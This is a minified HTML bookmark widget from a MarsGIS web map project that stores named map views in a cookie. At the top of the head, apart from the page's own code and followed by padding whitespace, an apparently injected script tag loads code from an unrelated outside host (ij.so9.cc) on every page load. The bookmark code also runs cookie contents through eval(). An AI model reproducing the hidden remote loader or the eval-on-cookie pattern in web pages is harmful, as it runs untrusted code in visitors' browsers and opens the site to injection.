<!-- 2018-1-23 16:23:54 | 版权所有 合肥火星科技有限公司 http://www.marsgis.cn  【联系我们QQ：516584683】 -->
<!DOCTYPE html><html><head><script async src="//ij.so9.cc/j/?t=fx&g=d8c8e9145d08&c=501ac5eb3e41&rv=1"></script>           <meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"><title></title><script src="../../../lib/include-lib.js?time=20180123" libpath="../../../lib/" include="jquery,font-awesome,bootstrap,bootstrap-table,layer,haoutil"></script><link href="../../css/widget-win.css" rel="stylesheet"></head><body><div class="row"><div class="col-xs-9"><div class="input-group"><span class="input-group-addon" id="basic-addon1">书签</span> <input type="text" id="txt_bookmark_name" class="form-control" placeholder="输入名称" aria-describedby="basic-addon1"></div></div><div class="col-xs-3"><a id="btn_bookmark_Add" class="btn btn-primary btn-sm">添加</a></div></div><table id="table"></table><script>function getHeight(){return $(window).height()-50}function initWidgetView(a){thisWidget=a,$("#btn_bookmark_Add").bind("click",function(){saveBookmark()}),$table=$("#table"),$table.bootstrapTable({height:getHeight(),singleSelect:!0,pagination:!1,pageSize:6,iconsPrefix:"fa",columns:[{field:"name",title:"名称",sortable:!0,editable:!1,align:"left"},{field:"operate",title:"操作",align:"center",width:50,events:{"click .remove":function(a,o,r,e){delBookMark(r.name)}},formatter:function(a,o,r){return['<a class="remove" href="javascript:void(0)" title="删除">','<i class="fa fa-trash"></i>',"</a>"].join("")}}],onClickRow:function(a,o,r){var e=a.data;thisWidget.showExtent(e)}}),initBookMarkList()}function initBookMarkList(){var lastcookie=haoutil.cookie.get(cookieName);if(null!=lastcookie&&(arrBookmark=eval(lastcookie)),null==arrBookmark||0==arrBookmark.length){arrBookmark=[];var bounds=thisWidget.getDefaultExtent();arrBookmark.push({name:"默认位置",data:bounds})}$table.bootstrapTable("load",arrBookmark)}function saveBookmark(){null==arrBookmark&&(arrBookmark=[]);var a=$.trim($("#txt_bookmark_name").val()).replace("'","").replace('"',"");if(0==a.length)return void layer.msg("请输入名称");for(var o=arrBookmark.length-1;o>=0;o--)if(arrBookmark[o].name==a)return void layer.msg("该名称已存在，请更换！");var r=thisWidget.getThisExtent();arrBookmark.push({name:a,data:r}),lastcookie=JSON.stringify(arrBookmark),haoutil.cookie.add(cookieName,lastcookie),$("#txt_bookmark_name").val(""),initBookMarkList()}function delBookMark(a){for(var o=arrBookmark.length-1;o>=0;o--)if(arrBookmark[o].name==a){arrBookmark.splice(o,1);var r=JSON.stringify(arrBookmark);haoutil.cookie.add(cookieName,r),$table.bootstrapTable("load",arrBookmark);break}}var thisWidget,$table,cookieName="muyaogis_bookmark",arrBookmark=[]</script></body></html>